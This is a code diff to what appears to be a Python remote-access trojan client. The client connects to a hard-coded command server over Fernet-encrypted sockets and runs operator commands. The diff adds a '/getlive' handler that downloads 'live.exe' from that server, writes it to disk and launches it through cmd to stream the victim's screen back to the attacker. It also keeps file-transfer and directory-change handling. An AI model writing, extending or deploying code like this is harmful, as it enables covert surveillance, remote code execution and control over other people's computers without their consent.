@@ -1,14 +1,12 @@
 import os, subprocess, socket
 from cryptography.fernet import Fernet
-from threading import Thread
-from vidstream import ScreenShareClient
 
 
 SERVER_HOST = 'xn--6pw65a019d.xyz'
 SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
-sender = ScreenShareClient(SERVER_HOST, 423)
+sender_port = 423
 key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
@@ -51,11 +49,30 @@ while True:
             f.write(data)
         f.close()
     if command == "/getlive":
-        p = Thread(target=sender.start_stream)
-        p.start()
+        if os.path.exists('live.exe'):
+            server_location = "yes"
+            server_location = Fernet(key).encrypt(server_location.encode())
+            s.send(server_location)
+        else:
+            server_location = "no"
+            server_location = Fernet(key).encrypt(server_location.encode())
+            s.send(server_location)
+            remaining = int.from_bytes(s.recv(4),'big')
+            f = open("live.exe","wb")
+            while remaining:
+                data = s.recv(min(remaining,4096))
+                remaining -= len(data)
+                f.write(data)
+            f.close()
+        subprocess.Popen(f'cmd /k live.exe -n {SERVER_HOST} -p {sender_port}')
+        server_state = "live Streaming Server is running"
+        server_state = Fernet(key).encrypt(server_state.encode())
+        s.send(server_state)
+        continue
     if command == "/stoplive":
-        sender.stop_stream() 
-        sender = ScreenShareClient(SERVER_HOST, 422)
+        #subprocess.Popen("cmd /k taskkill /im live.exe /f")
+        sender_port = 422
+        continue
     if splited_command[0].lower() == "cd":
         try:
             os.chdir(' '.join(splited_command[1:]))
